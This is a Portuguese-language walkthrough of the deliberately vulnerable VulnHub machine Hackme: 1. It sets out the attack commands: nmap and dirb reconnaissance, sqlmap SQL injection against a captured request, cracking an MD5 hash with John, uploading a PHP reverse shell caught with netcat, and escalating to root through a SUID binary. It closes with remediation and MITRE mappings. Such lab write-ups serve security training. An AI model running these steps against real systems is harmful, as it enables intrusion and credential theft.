# Hackme: 1 — Registrar, Dumpar, Subir, Root

Hackme: 1 é uma box para iniciantes bem construída que encadeia quatro técnicas perfeitamente: registre uma conta na aplicação web do alvo, capture a requisição autenticada com Burp, alimente para o sqlmap para dumpar o banco e extrair as creds do admin, depois use essas creds para subir um shell PHP via painel admin. Uma vez na box, um binário SUID chamado `touchmenot` em `/home/legacy` está basicamente gritando para você fazer um GTFOBin rumo ao root. Essa box ensina o loop completo de exploração web em menos de uma hora. Top demais.

| Campo | Valor |
|---|---|
| **Nível** | Fácil |
| **VM Alvo** | Hackme: 1 |
| **VM Atacante** | Kali Linux |
| **VulnHub URL** | https://www.vulnhub.com/entry/hackme-1,330/ |
| **Técnicas** | Recon Nmap, registro de conta web, captura de requisição com Burp Suite, sqlmap SQLi autenticado, upload de arquivo via painel admin, PHP reverse shell, Dirb brute-force de diretórios, privesc via binário SUID |
| **CVEs** | CWE-89 (SQL Injection em app web autenticado), CWE-434 (Upload de Arquivo sem Restrição), CWE-732 (Permissões SUID Incorretas) |
| **Grupos APT** | APT33 (Elfin): usa SQL injection autenticado contra portais web para colheita de credenciais em alvos do setor de energia; FIN7: explora consistentemente vulnerabilidades de upload de arquivo em aplicações web de varejo e hospitalidade |

---

## Resumo do Ataque

```
netdiscover + nmap → HTTP (80)
  |
  +--> Registrar conta no web app → capturar requisição auth no Burp
          |
          +--> sqlmap -r request.txt → dump BD → superadmin:senha
                  |
                  +--> Login como admin → painel de upload
                          |
                          +--> Subir PHP reverse shell → listener nc
                                  |
                                  +--> dirb → encontrar /uploads/shell.php
                                          |
                                          +--> curl trigger → shell (www-data)
                                                  |
                                                  +--> find SUID: /home/legacy/touchmenot
                                                          |
                                                          +--> ./touchmenot → root
```

---

## Metodologia

1. Descoberta de hosts e scan Nmap
2. Enumeração da aplicação web: descobrir registro e login
3. Registrar conta; capturar requisição POST autenticada com Burp Suite
4. SQL injection com sqlmap usando requisição capturada para dumpar banco de dados
5. Extrair credenciais admin do dump do banco
6. Login como admin; localizar funcionalidade de upload de arquivo
7. Subir PHP reverse shell; pegar com listener netcat
8. Brute-force de diretórios com Dirb para encontrar caminho de upload
9. Disparar shell; escalar via binário SUID `touchmenot`

---

## Passo 1 — Descoberta de Hosts e Scan de Portas

```bash
sudo netdiscover -r 192.168.1.0/24
# Alvo: 192.168.1.108

nmap -sV -sC -A 192.168.1.108
```

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.x
```

Apenas HTTP. Todo o ataque vive na porta 80.

**MITRE ATT&CK:** T1046 — Descoberta de Serviços de Rede

---

## Passo 2 — Enumeração da Aplicação Web

Acesse `http://192.168.1.108/`. Você encontrará uma aplicação web customizada com funcionalidade de registro e login.

```bash
dirb http://192.168.1.108/ /usr/share/wordlists/dirb/common.txt
```

Registre uma conta pela interface web: navegue até o formulário de registro, crie um usuário e faça login. Explore a funcionalidade autenticada.

**MITRE ATT&CK:** T1083 — Descoberta de Arquivos e Diretórios

---

## Passo 3 — Capturar Requisição e SQL Injection com sqlmap

Com o Burp Suite (ou OWASP ZAP) configurado como proxy, intercepte a requisição POST autenticada para um recurso de busca ou exibição de dados:

```bash
# Configurar proxy: 127.0.0.1:8080
# Interceptar requisição autenticada no Burp > salvar como /tmp/request.txt
```

Execute o sqlmap contra a requisição capturada:

```bash
sqlmap -r /tmp/request.txt --dbs
sqlmap -r /tmp/request.txt -D webapphacking --tables
sqlmap -r /tmp/request.txt -D webapphacking -T users --dump
```

O output revela a tabela `users` com usernames e senhas:

```
+-------+------------+----------------------------------+
| id    | user       | pasword                          |
+-------+------------+----------------------------------+
| 1     | superadmin | [hash MD5]                       |
+-------+------------+----------------------------------+
```

Quebre o hash MD5:

```bash
echo "[hash]" > /tmp/admin_hash.txt
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt /tmp/admin_hash.txt
```

Resultado: `superadmin:[senha]`

**Nota do mundo real:** SQL injection autenticado é extremamente comum em aplicações web customizadas. Desenvolvedores frequentemente autenticam o usuário corretamente mas depois passam input do usuário para queries SQL brutas sem parametrização. Isso é OWASP A03:2021 Injection, consistentemente a principal vulnerabilidade web por mais de uma década.

**MITRE ATT&CK:** T1190 — Explorar Aplicação Voltada ao Público; T1552.001 — Credenciais em Arquivos

---

## Passo 4 — Upload de Arquivo no Admin e Reverse Shell

Faça login como `superadmin` com a senha crackeada. Explore o painel admin para funcionalidade de upload de arquivo.

Prepare um PHP reverse shell:

```bash
cp /usr/share/webshells/php/php-reverse-shell.php /tmp/shell.php
# Edite: set $ip = '[ip_atacante]', $port = 4444
```

Inicie um listener netcat:

```bash
nc -lvnp 4444
```

Faça upload de `shell.php` via painel admin.

**MITRE ATT&CK:** T1505.003 — Componente de Software do Servidor: Web Shell

---

## Passo 5 — Encontrar Caminho de Upload e Disparar Shell

Faça brute-force de diretórios para encontrar onde os arquivos enviados ficam:

```bash
dirb http://192.168.1.108/ /usr/share/wordlists/dirb/common.txt
# Procure por: /uploads/, /files/, /images/, /media/
```

Uma vez encontrado o diretório de upload:

```bash
curl http://192.168.1.108/uploads/shell.php
```

O listener netcat pega o reverse shell como `www-data`. Estabilize:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
```

**MITRE ATT&CK:** T1059.004 — Interpretador de Script: Shell Unix

---

## Passo 6 — Escalação de Privilégios via Binário SUID

Enumere binários SUID:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Descoberta notável: `/home/legacy/touchmenot` tem o bit SUID set e é propriedade do root.

```bash
ls -la /home/legacy/
# -rwsr-xr-x 1 root root ... touchmenot

/home/legacy/touchmenot
id
# uid=0(root) gid=0(root) groups=0(root)

cat /root/flag.txt
```

gg. Root obtido via um binário SUID deliberadamente mal nomeado. Sensacional!

**Nota do mundo real:** Binários SUID customizados em diretórios home são uma misconfiguration clássica. Qualquer binário com SUID set e propriedade do root pode ser usado para escalação de privilégios. Em ambientes reais, desenvolvedores às vezes definem SUID em scripts ou utilitários por conveniência, inadvertidamente criando caminhos instantâneos para root.

**MITRE ATT&CK:** T1548.001 — Mecanismo de Controle de Elevação: Setuid e Setgid

---

## Flags, Hashes e Credenciais Capturadas

| Tipo | Valor | Encontrado Em | Método |
|---|---|---|---|
| Hash MD5 | [hash da tabela users] | webapphacking.users | dump sqlmap |
| Credenciais | superadmin:[senha] | Quebrado do hash | John/Hashcat |
| Shell www-data | processo web | /uploads/shell.php | Upload de arquivo |
| Shell root | uid=0 | Binário SUID | /home/legacy/touchmenot |
| Flag root | {flag} | /root/flag.txt | cat |

---

## Lições Aprendidas

| # | Descoberta | Relevância no Mundo Real | Takeaway Principal |
|---|---|---|---|
| 1 | SQLi autenticado, queries SQL brutas sem parametrização | OWASP A03:2021; afeta virtualmente todo app PHP customizado | Use prepared statements; ORM; queries parametrizadas em todo lugar |
| 2 | Credenciais admin armazenadas como hashes MD5 quebráveis | MD5 é quebrado para armazenamento de senhas; obsoleto desde ~2008 | Use bcrypt, Argon2 ou PBKDF2 para armazenamento de todas as senhas |
| 3 | Upload de arquivo PHP sem restrição (CWE-434) | Uma das vulnerabilidades web mais exploradas desde 2005 | Valide tipo de arquivo (MIME + extensão + magic bytes); armazene fora do web root |
| 4 | Binário SUID em diretório home | Binários SUID customizados são uma descoberta consistente de privesc em pentests Linux | Audite SUID com `find / -perm -u=s`; remova SUID de binários não essenciais |

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | ID TTP |
|---|---|---|---|
| Reconhecimento | Descoberta | Descoberta de Serviços de Rede | T1046 |
| Reconhecimento | Descoberta | Descoberta de Arquivos e Diretórios | T1083 |
| Acesso Inicial | Acesso Inicial | Explorar Aplicação Voltada ao Público | T1190 |
| Acesso a Credenciais | Acesso a Credenciais | Credenciais em Arquivos | T1552.001 |
| Acesso a Credenciais | Acesso a Credenciais | Força Bruta: Quebra de Senha | T1110.002 |
| Persistência | Persistência | Web Shell | T1505.003 |
| Execução | Execução | Interpretador de Script: Shell Unix | T1059.004 |
| Escalação de Privilégios | Escalação de Privilégios | Mecanismo de Controle de Elevação: Setuid | T1548.001 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Parametrize todas as queries SQL**: use PDO com prepared statements; nunca interpole input do usuário no SQL
2. **Substitua MD5 por KDF adequado**: bcrypt (custo 12+), Argon2id ou PBKDF2 para armazenamento de senhas
3. **Valide uploads de arquivo server-side**: verifique tipo MIME, extensão e magic bytes; armazene fora do web root; nunca execute conteúdo enviado
4. **Remova SUID de binários não essenciais**: audite com `find / -perm -u=s -type f 2>/dev/null`
5. **Implemente WAF**: detecte e bloqueie assinaturas do sqlmap e padrões comuns de SQLi

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gestão de Ativos | Inventariar todas as aplicações web customizadas; avaliar exposição a SQL injection |
| Proteger | Segurança de Dados | Prepared statements; armazenamento bcrypt; validação de upload |
| Proteger | Tecnologia de Proteção | WAF com detecção SQLi; monitoramento de integridade de arquivos em caminhos de upload |
| Detectar | Anomalias | Alertar em assinaturas sqlmap; arquivos PHP aparecendo em diretórios de upload |
| Responder | Planejamento de Resposta | Remover webshells enviados; fazer patch de SQL injection; rotacionar credenciais comprometidas |

### NIST SP 800-53 Rev. 5

| Controle | Descrição | Aplicação |
|---|---|---|
| SI-10 | Validação de Entrada de Informações | Validar todo input do usuário; parametrizar queries SQL |
| IA-5(1) | Autenticação Baseada em Senha | Bcrypt/Argon2 para armazenamento; sem MD5 |
| CM-6 | Configurações | Sem SUID em binários não essenciais |
| CM-7 | Funcionalidade Mínima | Restringir tipos de arquivo aceitos por formulários de upload |
| AC-6 | Menor Privilégio | Permissões mínimas necessárias para contas de serviço web |

---

## Considerações Finais

Hackme: 1 ensina o loop fundamental de exploração web que todo pentester precisa ter dominado: registrar, capturar, injetar, subir, obter shell, escalar. Quatro classes diferentes de técnicas, uma cadeia de ataque coesa.

O binário SUID chamado `touchmenot` é uma dica bem-humorada de que essa box recompensa a exploração. Em engajamentos reais existem binários customizados com nomes mais estranhos e misconfigurations piores. A lição é a mesma: sempre enumere SUID, sempre verifique o GTFOBins, mano.

Box sólida para iniciantes com profundidade metodológica real. Altamente recomendada para quem está aprendendo a stack de exploração web PHP.

Thanks guys!! (❍ᴥ❍ʋ)
